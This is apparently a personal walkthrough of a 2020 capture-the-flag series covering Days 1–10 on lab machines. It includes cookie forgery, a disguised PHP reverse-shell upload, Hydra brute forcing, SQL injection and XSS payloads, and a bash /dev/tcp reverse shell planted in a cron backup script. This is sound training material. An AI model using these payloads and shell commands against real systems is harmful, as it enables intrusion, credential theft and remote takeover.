# Day 1
* We can go onto the website and regsiter/login.
* Once we do that, viewing the cookies shows us a hexidecimal value named "auth"
* We can decode that with `echo <hex_string> | xxd -r -p`
* We want to log in to "santa", so let's switch our user for that with the following command:
* `echo <hex_string> | xxd -r -p | sed s/<your_username>/santa/g | xxd -p | tr -d '\n'`
* Once we replace the value of the previous cookie with the new one in the "Applications->Cookies" section on chrome developer tools, we get authenticated as santa and can turn on all the controls
* The flag is `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` 


# Day 2
* My ID number was `ODIzODI5MTNiYmYw`
	* We can then go to the website and enter that in as a GET parameter:
	* `http://10.10.71.84/?id=ODIzODI5MTNiYmYw`
* There's a place images, so let's try to upload a malicious script - a reverse shell
* I got a php reverse shell [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
        * Make sure you edit your ip to be the one on tun0 and change the port to what you want
```
$ip = '10.6.36.105';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```
* Uploading the php file doesn't work because the system doesn't allow php extensions
* Looking at the source code shows that the website allows uploads of `.jpeg, .jpg, .png`. Let's try to disguise our script as one of those
	* We can rename the file to `php-reverse-shell.jpg.php`
	* This works because this particular website checks file extensions by splitting on a period and checking the second index
* Now we need to find where the images are stored
	* We can do that with gobuster:
* `gobuster dir -u "http://10.10.71.84/" -w /usr/share/wordlists/dirb/common.txt" -b "200"
	* We include a blacklist for status codes of 200 because the website will return a 200 for any directory you put in
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://10.10.71.84/
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   200
[+] User Agent:              gobuster/3.0.1
[+] Timeout:                 10s
===============================================================
2020/12/02 19:04:07 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/cgi-bin/ (Status: 403)
/noindex (Status: 301)
/uploads (Status: 301)
===============================================================
2020/12/02 19:04:58 Finished
===============================================================
```
* We can see that `/uploads` is a valid directory. Going there on `http://10.10.71.84/uploads/` shows our uploaded shell

* Now we can set up a reverse listener on our machine with `nc -lvnp 1337`
	* Remember to use the same port as the one on the reverse shell script
* To run the script on their server, we can simply click on it
	* We get a shell!
* Now we can `cat /var/www/flag.txt` to get the flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`

# Day 3
* If we go to the IP, we can see a login page

## 1.Directory discovery
* This likely wasn't the intention of the person who made the problem, but we can get the flag with a bit of directory discovery
* `gobuster dir -u http://10.10.181.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.181.49/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/03 19:55:47 Starting gobuster
===============================================================
/tracker (Status: 200)
/Tracker (Status: 200)
===============================================================
2020/12/03 20:04:10 Finished
===============================================================
```
* We can see an open directory called `/tracker`
	* Going there gets us to the site without logging in
* The flag is `THM{885ffab980e049847516f9d8fe99ad1a}`  

## 2.Dictionary Credential Attack
* First, we can turn on burpsuite and our proxy and go to the link
* When we enter a test username and password, we get the following request:
```
POST /login HTTP/1.1
Host: 10.10.181.49
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.181.49
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.181.49/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ca;q=0.8
Connection: close

username=test&password=test1
```

* From here, we can do a dictionary attack in one of two ways:
### a) Burpsuite
* Hitting `CTRL + I` will send the request to the intruder tab of burpsuite
* Here, we can replace the usename and password variables with something else
	* You can see that burp put characters around your test username and password to indicate that they are variables:
		* `username=§test§&password=§test1§`
* Going to the Payloads subtab, we can load usernames in set 1 and passwords in set 2
	* You can either manually input common or discovered credentials, or you can use a wordlist
	* I'll be using the `cirt-default` wordlists in `usr/share/wordlists/seclists/`
* Now go back to the Positions subtab and select `Cluster bomb` as the attack type
* Hitting `Start Attack` will start trying passwords.
* We get a series of response codes and lengths
	* The one that is different from the others will be the one that likely got us a login
	* Only one request had a length of 255, and that used the username `admin` and the password `12345`
		* Trying that logs us in!
* The flag is `THM{885ffab980e049847516f9d8fe99ad1a}`

### b) Hydra
* We can use hydra to quickly do a dictionary attack
* There are a couple things we need to take note of first:
	* We are making a post request based on what we got from burp
	* We are making a post request to /login
	* When we get a username or password wrong, the website gives us the message `Your password is incorrect..`
* We can run the command `hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/seclists/Passwords/cirt-default-passwords.txt 10.10.181.49 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f`
	* `-L` sets the username list
	* `-P` sets the password list
	* `10.10.181.49` is the website
	* `http-post-form` is the request type that burp gave us
	* `/login` is where burp indicated the post request was being sent
	* `username=^USER^&password=^PASS^` is the request that burp indcated was being sent (with variables being set with `^USER^` and `^PASS^`)
	* `incorrect` is a word that shows up on the website when our login doesn't work
	* `-f` ends the attack once one of our credentials works

* We get the following response: `[80][http-post-form] host: 10.10.181.49   login: admin   password: 12345`
* Logging in gets us the flag: `THM{885ffab980e049847516f9d8fe99ad1a}`

# Day 4

## Gobuster
* `gobuster dir -u http://10.10.143.161 -w /usr/share/wordlists/dirb/common.txt -x php -t 20`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.143.161
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/12/05 02:53:24 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/api (Status: 301)
/index.html (Status: 200)
/LICENSE (Status: 200)
/server-status (Status: 403)
===============================================================
2020/12/05 02:54:50 Finished
===============================================================
```
* The `/api` folder stands out
	* There's a file in the directory called `site-log.php`

## Fuzzing
* We know from the challenge there's an a api that `creates logs using dates with a format of YYYYMMDD`
* Let's generate a wordlist with some potential dates:
```python
start_year = 2019
end_year = 2020


with open("dates.txt", "w") as fout:
	for year in range(start_year, end_year+1):
		for month in range(1,13):
			for day in range(1,32): # We don't have to worry about some minor inefficiencies in dates
				fout.write(f'{year}{month:02}{day:02}\n')
```
* Now that we have a set of potential dates in the file `dates.txt`, we can run the following command:
* `wfuzz -z file,dates.txt --hw 0 10.10.143.161/api/site-log.php?date=FUZZ`
	* `-z file,dates.txt` indicates that we're looking for files by replacing "FUZZ" witht the words in `dates.txt`
	* `--hw 0` indicates that we don't want any responses with 0 words
	* `10.10.143.161/api/site-log.php?date=FUZZ` indicates the file we are requesting with "FUZZ" replacing what should be the date
```
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.143.161/api/site-log.php?date=FUZZ
Total requests: 744

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                     
===================================================================

000000707:   200        0 L      1 W      13 Ch       "20201125"                                                                                                  

Total time: 13.23737
Processed Requests: 744
Filtered Requests: 743
Requests/sec.: 56.20448
```	
* We see that the date `20201125` worked
* Going to `http://10.10.143.161/api/site-log.php?date=20201125` gives us the flag: `THM{D4t3_AP1}`


# Day 5
* When we go to `http://10.10.0.174:8000/`, we can see the website homepage
* The challenge tells us not to bruteforce the login page, but let's do it anyway
* I tried gobuster with the stock wordlist and it didnt' work, so let's make a custom wordlist
* First, we can get some words with `cewl http://10.10.0.174:8000/ > websiteWords.txt`
* Now, to generate the wordlist with that, we can use [mentalist](https://github.com/sc0tfree/mentalist)
	* We can input in our baselist as `/usr/share/wordlists/dirb/common.txt` and set our append or prepend to `websiteWords.txt`. The case can also be chosen
	* I saved this in `finalWordlist.txt`
* Then, running `gobuster dir -u http://10.10.0.174:8000/ -w finalWordlist.txt -t 20`, we get the following: 
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.0.174:8000/
[+] Threads:        20
[+] Wordlist:       finalWordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/06 05:10:18 Starting gobuster
===============================================================
/santapanel (Status: 200)
===============================================================
2020/12/06 05:50:54 Finished
===============================================================
```

* `/santapanel` works. When we go there, we get a login page
* Let's try to get past it with a bit of SQLi
* Inputting `' OR 1=1 ; --` logs us in
	* `'` ends the string
	* `OR 1=1` returns true, which allows the query to select everything
	* `; -- ` ends the query and ignores everything afterward
* Now we can input the same stuff, and that gets us all of the gifts and children (22 of them), but we can't see the rest of the database
	* Another way to ouput the full two columns that might seem more intuitive is `' ; --`
* We can assume that there's also a username and password column, so let's type in `' UNION SELECT username, password FROM users --`
	* This shows use the username `admin` and the password `EhCNSWzzFP6sc7gB`, but we still can't see the flag
* We don't know the names of the tables, so let's get that by appending the tablenames with `' UNION SELECT name, sql FROM sqlite_master WHERE type='table' ; --`
* Now we can see that there are tables called `hidden_table`, `sequels`, and `users`
* The `hidden_table` table has the column `flag` of type `text`
	* Let's get those with `' UNION SELECT flag,NULL FROM hidden_table ; --`
	* Now we can see the flag `thmfox{All_I_Want_for_Christmas_Is_You}`

* Of course, all of this could also be automated with sqlmap
* Using burpsuite, we could turn on our proxy and intercept a request on the search page
	* I saved this as `burpFile.txt` by right-clicking on the request in burp and selecting `Save Item`
* Now, we can run `sqlmap -r burpFile.txt --dbms=sqlite -a` and press enter a few times to chose default settings, which will dump the whole database

# Day 6
* Going to `http://10.10.249.208:5000/`, there a are a couple inputs
	* We can input an example wish
	* Now, going to the source code of the website, we can see that it was modified
		* This tells us that the site likely isn't pulling from some kind of database.
* We can test for cross-site scripting by typing in `<script>alert(1)</script>`
	* This doesn't work and looks like it breaks the page instead.
* Maybe they're sanitizing the input?
	* One way that inputs are sanitized is by checking tags on the outside of the input
	* We can try `</script><script>alert(1)</script><script>`	
		* Because `</thing><thing>` isn't valid html, that can get past the site
	

* Another way that we see a possible exploit is through the get requests made in the url `http://10.10.249.208:5000/?q=<INPUT>`
	* We can see that there's a parameter `q` that we can set equal to our query
	* Let's try `http://10.10.249.208:5000/?q=<script>alert(2)</script>`
		* That works


* Of course, the testing here can be done automatically by running an automatic scan with ZAP and looking at the alerts
	* When running this, it gives options for persistent and reflected xss

# Day 7
* Opening `pcap1.pcap` in wireshark, looking at the `Info` column, we can look for `ICMP`
	* Once we find that, we can look at the `Source` column to get the IP: `10.11.3.2`

* We can filter for GET requests with `http.request.method == GET`

* We can look at GET requests made with a specific ip with `http.request.method == GET && ip.src == 10.10.67.199`
	* It looks like this machine visited `/posts/reindeer-of-the-week/`
		* The article name is `reindeer-of-the-week`


* Typing `ftp` as a filter shows us all the ftp traffic
	* There's a request that shows us the info `Request: USER elfmcskidy`
		* We can right-click on this and select `follow` -> `TCP Stream` to see all te requests made in this stream
		* We get the following output in ASCII mode:
```
220 Welcome to the TBFC FTP Server!.
USER elfmcskidy
331 Please specify the password.
PASS plaintext_password_fiasco
530 Login incorrect.
SYST
530 Please login with USER and PASS.
QUIT
221 Goodbye.
```
* Username: `elfmcskidy`
* Password: `plaintext_password_fiasco`

* There's also a request for `USER anonymous`, but we don't care too much about that since we're looking for credentials

* Scrolling through the pcaps, we can look at the `Protocol` column and we see a lot of `SSH` packets

* Looking through the packets a bit more, we can see that `HTTP` made a `GET` request for `/christmas.zip`
* An easy way to extract files out of wireshark packet captures is by going to `File` -> `Export Objects` -> `HTTP` (because we saw that was how the file was downloaded) -> select `christmas.zip`
	* Once you save the file, you can extract it and `cat elf_mcskidy_wishlist.txt`, which gets the following output:
```
Wish list for Elf McSkidy
-------------------------
Budget: £100

x3 Hak 5 Pineapples
x1 Rubber ducky (to replace Elf McEager)
```
* The replacement for Elf McEager is `Rubber ducky`

# Day 8
### IP
`10.10.4.45`

| [Snort](https://www.cyber.gov.au/acsc/view-all-content/glossary/snort) is a free open source network intrusion detection system and intrusion prevention system created in 1998 by Martin Roesch, founder and former CTO of Sourcefire. Snort is now developed by Cisco, which purchased Sourcefire in 2013.



### Nmap Scan
`nmap -sV -sC 10.10.4.45 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:05 EST
Nmap scan report for 10.10.4.45
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Hugo 0.78.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: TBFC&#39;s Internal Blog
2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.05 seconds

```
* Ports `80,2222,3389` are open
* The server is likely running on `ubuntu`
* The site is hosting "TBFC's Internal `Blog`, which can be seen in the HTTP-TITLE

`nmap -Pn 10.10.4.45 -oN ignoreICMP.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:09 EST
Nmap scan report for 10.10.4.45
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
```

`nmap -A -T4 -Pn 10.10.4.45 -oN`
* `A typical Nmap scan is shown in Example 1. The only Nmap arguments used in this example are -A, to enable OS and version detection, script scanning, and traceroute`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:12 EST
Nmap scan report for 10.10.4.45
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Hugo 0.78.2
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: TBFC&#39;s Internal Blog
2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)
3389/tcp open  ms-wbt-server xrdp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/10%OT=80%CT=1%CU=39585%PV=Y%DS=4%DC=T%G=Y%TM=5FD1CB
OS:05%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST
OS:11NW6%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2382/tcp)
HOP RTT       ADDRESS
1   40.33 ms  10.6.0.1
2   ... 3
4   113.65 ms 10.10.4.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.07 seconds
```


# Day 9
### IP
`10.10.241.67`


### nmap
`nmap -sC -sV 10.10.241.67 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-10 02:26 EST
Nmap scan report for 10.10.241.67
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
| drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
| drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
|_drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.36.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6:ce:52:11:22:9e:b1:c0:ae:45:2a:f9:2f:70:eb:cb (RSA)
|   256 4b:77:b2:d4:76:53:8c:ec:cb:be:3a:69:51:ff:3c:8f (ECDSA)
|_  256 53:3f:2f:ca:c2:d6:ce:ec:99:30:f7:1f:ce:a5:d7:f5 (ED25519)
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.91 seconds
```
* nmap tells us that ftp is open with anonymous login
* It also says we can upload scripts

### FTP login
`ftp 10.10.241.67`
* We can log in with `ftp 10.10.241.67` and with the username `anonymous`
* Now, typing `dir` shows us that we have access to all the directories listed, but only `public` actually has anything
* Go to the directory with `cd public` and download the files with `get backup.sh` and `get shoppinglist.txt`
* exit by typing `quit`
* `cat shoppinglist.txt` on our own machine shows us that santa wanted `The Polar Express Movie`

### Reverse Shell
* When we look at `backup.sh`, we cn see that the script automatically runs periodically to backup
* Luckily, we are allowed to modify files on the ftp server, which means we can add in a script to get us a reverse shell
* We can edit the script to include `/bin/bash -i >& /dev/tcp/10.6.36.105/1337 0>&1` at the end (ensuring you pick your ip on tun0)
	* Set up a listener locally with `nc -lvnp 1337`
* Now, we can upload the file by loggin in again, running `delete backup.sh` and replacing it with our copy by typing `put backup.sh`
* Waiting for a couple minutes gets us a reverse shell!

* Now we can `cat /root/root/txt` to get the flag: `THM{even_you_can_be_santa}`

# Day 10
IP: `10.10.51.9`
### nmap
`nmap -sC -sV 10.10.51.9 -oN initial.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 11:09 EST
Nmap scan report for 10.10.51.9
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:70:d4:c2:86:0e:e3:fb:9f:0a:36:7a:11:36:a5:dc (RSA)
|   256 4b:12:67:10:b4:a5:21:0d:30:ad:ef:15:ae:c4:04:97 (ECDSA)
|_  256 e4:ea:83:e9:cf:fe:9f:e9:fa:a2:8e:2f:b7:fc:b4:c0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: TBFC-SMB-01)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: TBFC-SMB-01)
Service Info: Host: TBFC-SMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: TBFC-SMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: tbfc-smb
|   NetBIOS computer name: TBFC-SMB\x00
|   Domain name: \x00
|   FQDN: tbfc-smb
|_  System time: 2020-12-20T16:10:17+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-20T16:10:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.73 seconds

```
* We have smb running. Let's use enum4linux and smbmap:

### enum4linux
`enum4linux -U 10.10.51.9`
```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 20 11:07:35 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.51.9
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.51.9    |
 ================================================== 
[+] Got domain/workgroup name: TBFC-SMB-01

 =================================== 
|    Session Check on 10.10.51.9    |
 =================================== 
[+] Server 10.10.51.9 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.51.9    |
 ========================================= 
Domain Name: TBFC-SMB-01
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================== 
|    Users on 10.10.51.9    |
 =========================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc: 

user:[elfmcskidy] rid:[0x3e8]
user:[elfmceager] rid:[0x3ea]
user:[elfmcelferson] rid:[0x3e9]
enum4linux complete on Sun Dec 20 11:07:44 2020

```
* We see users `elfmcskidy`, `elfmceager`, and `elfmcelferson`
### smbmap
`smbmap -H 10.10.51.9`
```
[+] Guest session   	IP: 10.10.51.9:445	Name: 10.10.51.9                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	tbfc-hr                                           	NO ACCESS	tbfc-hr
	tbfc-it                                           	NO ACCESS	tbfc-it
	tbfc-santa                                        	READ, WRITE	tbfc-santa
	IPC$                                              	NO ACCESS	IPC Service (tbfc-smb server (Samba, Ubuntu))

```
* There are 4 shares running
* We can access the `tbfc-santa` share
	* Let's do that with `smbclient //10.10.51.9/tbfc-santa` and by pressing enter without a password
* `dir` shows us that theres a directory and a file
	* We can download the file with `get note_from_mcskidy.txt`
	* There's an empty directory called `jingle-tunes`
	* Unfortunately, it doesn't look like there's anything interesting here
# Day 11

# Day 12

# Day 13

# Day 14

# Day 15

# Day 16

# Day 17

# Day 18

# Day 19

# Day 20
